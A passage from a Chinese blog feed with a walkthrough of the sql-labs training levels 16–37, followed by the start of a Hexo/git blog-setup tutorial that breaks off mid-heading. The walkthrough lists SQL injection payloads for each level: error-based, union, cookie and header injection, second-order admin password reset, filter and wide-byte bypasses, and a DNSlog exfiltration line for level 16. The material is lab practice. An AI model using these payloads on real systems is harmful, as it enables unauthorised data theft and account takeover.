class="headerlink" title="Less-16-基于”) 的POST型注入"></a>Less-16-基于”) 的POST型注入</h1><p>这题同上，可以用dns传值<br>构造一下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.e8vwb8.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure><p>tips：最开始用1”) 发现一直注入不成功<br>后来仔细看的时候突然发现mysql注入的值是username<br>前几题都能行，所以一时间没看出来ε = = (づ′▽`)づ<br><img src="https://img-blog.csdnimg.cn/20210209133959999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-17-基于’-的密码注入"><a href="#Less-17-基于’-的密码注入" class="headerlink" title="Less-17-基于’ 的密码注入"></a>Less-17-基于’ 的密码注入</h1><p>这题刚开始的时候用老套路在username那整了好一会，发现怎么都注入不成功，然后突然发现上方有一个[PASSWORD RESET]<br>才反应过来这题可能是从password中注入，老眼瞎了(ˇωˇ」∠)_<br>试着构造了一下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure><p>tips：这题使用了update函数，所以username得是正确的，这里以admin为例</p><p><img src="https://img-blog.csdnimg.cn/20210210111924293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-18-基于’-的user-agent报头文件注入"><a href="#Less-18-基于’-的user-agent报头文件注入" class="headerlink" title="Less-18-基于’ 的user-agent报头文件注入"></a>Less-18-基于’ 的user-agent报头文件注入</h1><p>这关不看源代码感觉还真不好整，瞎吉尔整了半天，结果一看源代码才知道是用user-agent报头文件注入的<em>(:3⌒ﾞ)</em><br>正好是第一次遇见这种类型题，去找了一下大致解法<br>由于锁username和password了，所以要先知道username和password才可以进行下一步<br>于是使用burpsuite爆破用户名和密码（这种方法其实并不实用<br><img src="https://img-blog.csdnimg.cn/20210210215719507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>爆破出用户名、密码，然后进行user-agent注入<br>这里给出payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021022004258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-19-基于’-的referer报头文件注入"><a href="#Less-19-基于’-的referer报头文件注入" class="headerlink" title="Less-19-基于’ 的referer报头文件注入"></a>Less-19-基于’ 的referer报头文件注入</h1><p>这题跟上题一样，但是是referer的报头文件注入<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210210220649426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-20-基于’-的cookie注入"><a href="#Less-20-基于’-的cookie注入" class="headerlink" title="Less-20-基于’ 的cookie注入"></a>Less-20-基于’ 的cookie注入</h1><p>这题是真的整了好久，刚看到这题的时候我以为跟前几道报头注入的题一样，更改一下报头就行了，但是尝试了好一会发现不行。＿|￣|○<br>于是感觉可能是代码更改过了，跟前几题的代码不一样，所以去看了一下源代码，发现确实不一样了，闭合点改了，所以重新修改了一下payload交上去发现还是不行。(｀Д´*)<br>最后选择去看了看网上的payload，发现是因为这题username,password,submit都限定了，只要提交了username和password就进不去注入点，由于我是用burpsuite的重发器进行payload测试的，所以一直卡在那里。┐(￣ヮ￣)┌<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;union select 1,2,(updatexml(1,concat(0x7e,database(),0x7e),1)) #;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210210222517580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-21-基于’-的cookie注入"><a href="#Less-21-基于’-的cookie注入" class="headerlink" title="Less-21-基于’ 的cookie注入"></a>Less-21-基于’ 的cookie注入</h1><p>这关根据提示可以知道，是和20关一样是用cookie进行注入，于是构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210212161718460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现回显错误，并且是乱码，第一次遇到这种类型题，也不知道是为啥乱码。(:3_ヽ)_<br>于是决定去看一眼源代码，发现在交sql语句之前进行了一次base64解码才交到query的。<br><img src="https://img-blog.csdnimg.cn/20210212161934107.png"><br>所以拿payload去进行一次base64编码<br><img src="https://img-blog.csdnimg.cn/20210212162035826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后再交一次<br><img src="https://img-blog.csdnimg.cn/20210212162116623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">注入成功辣。</p><h1 id="Less-22-基于”-的cookie注入"><a href="#Less-22-基于”-的cookie注入" class="headerlink" title="Less-22-基于” 的cookie注入"></a>Less-22-基于” 的cookie注入</h1><p>这关和上一关一样，只不过注入语句从’) 变为了’ “<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210212162427239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-23-过滤注释符的GET注入"><a href="#Less-23-过滤注释符的GET注入" class="headerlink" title="Less-23-过滤注释符的GET注入"></a>Less-23-过滤注释符的GET注入</h1><p>这关跟第一关一样，是简单的GET注入，不过把注释符过滤掉了，但是我们可以选择用一个单引号把后边的那个单引号闭合一下就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39; union select 1,2,3 &#39; 1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021216480899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-24-基于’-的二次注入"><a href="#Less-24-基于’-的二次注入" class="headerlink" title="Less-24-基于’ 的二次注入"></a>Less-24-基于’ 的二次注入</h1><p>这一关的提示是二次注入，去看看万能的网友的解释，二次注入其实就是使用一个账户来更改其他账户的用户名和密码。<br>在看看pass-change的源代码，知道可以从update这里入手。<br>我们先新建一个带有注入效果的用户名<br><img src="https://img-blog.csdnimg.cn/20210212170757731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><p>然后登入更改密码<br><img src="https://img-blog.csdnimg.cn/20210212170831823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后就可以使用刚刚更改的密码登入admin的用户了<br><img src="https://img-blog.csdnimg.cn/20210212170911868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">最后解释下原理，这关二次注入的原理其实就是把使用一个带注释符的用户名<br>把原来的update sql注入语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure><p>通过带有注释符的用户名变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39; -- - &#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure><p>于是后面的password认证就被注释掉了<br>最后就变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><h1 id="Less-25-禁止and和or的注入"><a href="#Less-25-禁止and和or的注入" class="headerlink" title="Less-25-禁止and和or的注入"></a>Less-25-禁止and和or的注入</h1><p>这关进来后得到提示，我们的and 和 or 都被禁止了，所以可以考虑使用联合注入<br>这里是payload</p><blockquote><p>id=-1’ union select 1,2,3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210214141956339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70" alt="="></p><h1 id="Less-25a-禁止and和or的注入"><a href="#Less-25a-禁止and和or的注入" class="headerlink" title="Less-25a-禁止and和or的注入"></a>Less-25a-禁止and和or的注入</h1><p>这关跟上一关一样，但是注入点改为了无限制注入<br>这里是payload</p><blockquote><p>id=-1 union select 1,2,3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210214142247503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-26-过滤了空格和注释的注入"><a href="#Less-26-过滤了空格和注释的注入" class="headerlink" title="Less-26-过滤了空格和注释的注入"></a>Less-26-过滤了空格和注释的注入</h1><p>这关把空格和注释过滤掉了，所以我们可以选择使用单引号闭合后面的单引号<br>由于过滤and和or的机制是and = “”<br>所以我们可以这样子绕过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aandnd</span><br></pre></td></tr></table></figure><p>当里面的and被过滤成空了之后，两边合在一起就变成了一个新的and<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;aandnd(updatexml(1,concat(0x7e,database(),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210214151612998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-27-过滤了union和select的注入"><a href="#Less-27-过滤了union和select的注入" class="headerlink" title="Less-27-过滤了union和select的注入"></a>Less-27-过滤了union和select的注入</h1><p>这关把union和select过滤掉了，但没啥事，我们前几关都在用报错注入，所以这一关也一样<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;and(updatexml(1,concat(0x7e,database(),0x7e),1))and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210214155612387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-28-过滤了union和select的注入，且报错注入不可用"><a href="#Less-28-过滤了union和select的注入，且报错注入不可用" class="headerlink" title="Less-28-过滤了union和select的注入，且报错注入不可用"></a>Less-28-过滤了union和select的注入，且报错注入不可用</h1><p>这关是过滤了union和select的注入，所以进来第一时间想到了报错，结果发现报错不可用，因为报错点被注释掉了，查了查发现可以用转编码<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">编码前</span><br><span class="line">-1&#39;) UnIon All Select (&#39;1&#39;),2,(&#39;3</span><br><span class="line">编码后</span><br><span class="line">999%27)%0AUnIon%0AAll%0ASelect%0A(%271%27),2,(%273</span><br><span class="line">tips：%0A是换行符</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210216140251280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-29-基于’-的字符型注入"><a href="#Less-29-基于’-的字符型注入" class="headerlink" title="Less-29-基于’ 的字符型注入"></a>Less-29-基于’ 的字符型注入</h1><p>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202102161406411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-30-基于”-的字符型注入"><a href="#Less-30-基于”-的字符型注入" class="headerlink" title="Less-30-基于” 的字符型注入"></a>Less-30-基于” 的字符型注入</h1><p>这关跟上一关一样，但是变成了”<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021614155615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-31-基于”-的字符型注入"><a href="#Less-31-基于”-的字符型注入" class="headerlink" title="Less-31-基于”) 的字符型注入"></a>Less-31-基于”) 的字符型注入</h1><p>这关也没过滤啥<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999&quot;) union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210217161755650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-32-基于’-的宽字节注入"><a href="#Less-32-基于’-的宽字节注入" class="headerlink" title="Less-32-基于’ 的宽字节注入"></a>Less-32-基于’ 的宽字节注入</h1><p>这关用反斜杠 / 把’ 和 “ 转义掉了，所以直接使用的话是不能闭合的，那么我们可以试一下宽字节注入<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218141253620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>这关跟上一关一样，只不过是用了php内的函数来进行反斜杠转义，也可以使用宽字节注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218141554168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-34-POST方式的宽字节注入"><a href="#Less-34-POST方式的宽字节注入" class="headerlink" title="Less-34-POST方式的宽字节注入"></a>Less-34-POST方式的宽字节注入</h1><p>这关也是宽字节注入，但是注入方式变为了POST型注入<br>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1�&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021819393675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-35-数值型注入"><a href="#Less-35-数值型注入" class="headerlink" title="Less-35-数值型注入"></a>Less-35-数值型注入</h1><p>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999 union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218194057972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-36-基于’-的宽字节注入"><a href="#Less-36-基于’-的宽字节注入" class="headerlink" title="Less-36-基于’ 的宽字节注入"></a>Less-36-基于’ 的宽字节注入</h1><p>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218194250953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-37-基于POST型的宽字节注入"><a href="#Less-37-基于POST型的宽字节注入" class="headerlink" title="Less-37-基于POST型的宽字节注入"></a>Less-37-基于POST型的宽字节注入</h1><p>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999�&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218194420881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql-labs-less-1-10&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://rossweisse.github.io/categories/Web/"/>
    
    
    <category term="sql" scheme="https://rossweisse.github.io/tags/sql/"/>
    
    <category term="sql-labs" scheme="https://rossweisse.github.io/tags/sql-labs/"/>
    
  </entry>
  
  <entry>
    <title>github+hexo搭建个人博客教程</title>
    <link href="https://rossweisse.github.io/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <id>https://rossweisse.github.io/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</id>
    <published>2021-01-12T14:58:31.000Z</published>
    <updated>2021-02-06T01:57:36.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul><li>环境搭建<ul><li>安装node.js</li><li>安装git</li><li>安装Hexo</li></ul></li><li>github仓库的创建</li><li>githubSSH的配置</li><li>sublime的安装使用</li><li>Hexo与github连接</li><li>Hexo的主题切换<a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2></li><li>安装node.js之前请先安装npm并了解相关知识</li></ul><p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p><p>检查node.js是否安装成功，win+r打开命令窗口，输入node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js 检测"><br>出现版本号即安装成功</p><p>检查npm是否安装成功，在命令窗口下，输入npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm 检测"><br>出现版本号即安装成功</p><p>好啦，到这里Hexo的环境已经搭建完毕了</p><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h3 id="1、git下载"><a href="#1、git下载" class="headerlink" title="1、git下载"></a>1、git下载</h3><p>git的下载可以去官网下载<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/download，但是会有点慢。</a><br>觉得慢的可以去这个网址下载链接：<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> 提取码：qivu </p><h3 id="2、git安装"><a href="#2、git安装" class="headerlink" title="2、git安装"></a>2、git安装</h3><p>1、下载完后双击安装程序Git-2.30.0-64-bit，进入安装界面，点击next：<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、选择安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、安装配置窗口，包括git命令行、git图形界面等：<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、选择开始菜单文件：<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5、选择git的默认编译器，推荐vim：<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6、选择仓库的初始名称，选默认就好了：<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7、选择可以用windows命令行操作，也可用git bash操作：<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8、HTTPS传输后台，用默认的就行了：<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9、选择换行符，默认unix格式，如果检测到windows格式则自动转换为unix格式：<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10、选择配置默认终端：<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11、选择git pull风格，推荐默认：<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12、选择凭据管理，推荐默认选项：<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13、配置额外的选项，选择文件缓存：<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14、这是新功能，不推荐选择：<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15、安装中：<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16、安装成功辣：<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17、在任意文件夹中，右键即可选择<br>Git GUI为git图形界面工具<br>Git Bash为命令行工具<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p><h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Hexo安装-1"><a href="#Hexo安装-1" class="headerlink" 